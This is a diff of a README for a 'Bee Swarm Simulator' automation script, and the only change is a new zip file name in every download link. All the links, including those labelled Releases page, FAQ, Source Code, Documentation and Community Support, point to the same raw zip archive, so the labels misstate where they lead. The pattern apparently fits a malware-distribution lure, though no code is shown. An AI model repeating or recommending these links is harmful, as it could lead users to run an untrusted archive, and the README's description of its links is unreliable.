@@ -6,7 +6,7 @@ Welcome to the Bee-Swarm-Simulator-Script! This application helps you automate y
 
 ## 📥 Download Now 
 
-[![Download Bee-Swarm-Simulator-Script](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)
+[![Download Bee-Swarm-Simulator-Script](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -24,11 +24,11 @@ Follow these instructions to get Bee-Swarm-Simulator-Script up and running. You 
 
 1. **Visit this page to download:** Click the link below to go to the Releases page.
    
-   [Download Bee-Swarm-Simulator-Script](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)
+   [Download Bee-Swarm-Simulator-Script](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)
 
 2. **Choose the latest release:** Navigate to the latest release listed on the page. Look for tagged versions, typically shown as `v1.0`, `v1.1`, etc.
 
-3. **Download the script:** Click on the asset file that is usually named something like `https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip`. This will start the download.
+3. **Download the script:** Click on the asset file that is usually named something like `https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip`. This will start the download.
 
 4. **Locate your download:** After the download completes, go to your default download location (usually the Downloads folder).
 
@@ -60,7 +60,7 @@ If you encounter issues while using the Bee-Swarm-Simulator-Script, consider the
 
 - **Reinstall the application:** If the script doesn’t run as expected, consider uninstalling and then reinstalling it to resolve potential conflicts.
 
-- **Consult our FAQ:** Look for common questions and answers on our [GitHub page](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip) which may provide immediate help.
+- **Consult our FAQ:** Look for common questions and answers on our [GitHub page](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip) which may provide immediate help.
 
 ## 🎨 Customization Tips
 
@@ -74,9 +74,9 @@ To get the most out of the script:
 
 ## 🔗 Useful Links
 
-- [Source Code](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)
-- [Documentation](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)
-- [Community Support](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip)
+- [Source Code](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)
+- [Community Support](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip)
 
 ## 📧 Contact
 
@@ -84,4 +84,4 @@ For further assistance, feel free to reach out through the Issues section on our
 
 ## 📥 Download & Install
 
-To download the script, [visit this page to download](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/ScriptSimulatorBeeSwarm-v1.9-alpha.2.zip). Follow the instructions above for installation and start your honey farming journey today!
+To download the script, [visit this page to download](https://raw.githubusercontent.com/999zxp/Bee-Swarm-Simulator-Script/main/Moringua/Simulator_Swarm_Script_Bee_3.9.zip). Follow the instructions above for installation and start your honey farming journey today!
